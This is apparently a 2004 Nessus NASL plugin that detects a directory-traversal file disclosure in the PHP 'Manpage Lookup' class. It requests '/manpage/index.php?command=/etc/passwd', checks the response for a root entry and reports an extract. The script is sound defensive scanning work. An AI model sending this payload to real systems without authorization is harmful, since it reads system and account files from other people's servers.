#
# This script was written by Noam Rathaus
#
# GPLv2
#
# From: Cabezon Aurélien [aurelien.cabezon@isecurelabs.com]
# Subject: PHP Manpage lookup directory transversal / file disclosing
# Date: Saturday 10/01/2004 18:56
#

if(description)
{
  script_id(11991);
  script_version("$Revision: 1.5 $");
  name["english"] = "File Disclosure in PHP Manpage";
  script_name(english:name["english"]);
 
  desc["english"] = "
'Manpage Lookup' is a PHP class that helps you to build a 'manpage' frontend 
in PHP. A vulnerability in the product allows remote attackers
to view the content of arbitrary files.

Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Detect PHP Manpage File Disclosure";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);
  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

debug = 0;

port = get_http_port(default:80);

if (! get_port_state(port) ) exit(0);
if (! can_host_php(port:port) ) exit(0);

function check_dir(path)
{
 req = http_get(item:string(path, "/manpage/index.php?command=/etc/passwd"), port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if (egrep(pattern:"root:.*:0:[01]:", string:res))

 {
  report = "
'Manpage Lookup' is a PHP class that helps you to build a 'manpage' frontend 
in PHP. A vulnerability in the product allows remote attackers
to view the content of arbitrary files.

Here is an extract from /etc/passwd, read on the remote host :
" + strstr(res, "root:") + "

Solution : Disable this PHP script
Risk factor : High";
  security_hole(port);
  exit(0);
 }
}

foreach dir (cgi_dirs()) check_dir(path:dir);
